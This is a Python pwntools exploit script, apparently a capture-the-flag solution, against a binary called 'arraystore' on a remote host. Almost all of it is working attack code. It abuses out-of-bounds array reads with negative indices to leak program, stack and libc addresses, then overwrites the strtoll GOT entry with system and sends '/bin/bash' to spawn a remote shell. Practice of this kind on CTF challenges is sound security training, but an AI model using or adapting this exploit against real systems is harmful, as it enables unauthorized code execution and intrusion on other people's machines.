#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./arraystore --host 34.124.157.94 --port 10546
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./arraystore')
libc = ELF('./libc.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.124.157.94'
port = int(args.PORT or 10546)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


def read(idx: int) -> int:
    io.sendlineafter(b"Read/Write?: ", b"R")
    io.sendlineafter(b"Index: ", f"{idx}".encode())
    return int(io.recvline(keepends=False).split()[-1])


def write(idx: int, value: int) -> None:
    io.sendlineafter(b"Read/Write?: ", b"W")
    io.sendlineafter(b"Index: ", f"{idx}".encode())
    io.sendlineafter(b"Value: ", f"{value}".encode())


leak_main = read(-1)
exe.address = leak_main - exe.symbols["main"] - 357
strtoll = exe.got["strtoll"]
log.info(f"{exe.address=:#x}")
log.info(f"{strtoll=:#x}")

leak_stack = read(-7)
rsp = leak_stack - 800
log.info(f"{rsp=:#x}")

idx = ((rsp - strtoll) // 8) * -1

leak_strtoll_libc = read(idx)
# with the last 3 nibbles of leaked strtoll function address,
# search on libc database for matching libc file
log.info(f"{leak_strtoll_libc=:#x}")
libc.address = leak_strtoll_libc - libc.symbols['strtoll']
log.info(f"{libc.address=:#x}")

# overwrite strtoll GOT entry with system
write(idx, libc.symbols["system"])

io.sendlineafter(b"Read/Write?: ", b"R")
io.sendlineafter(b"Index: ", b"/bin/bash")

io.interactive()
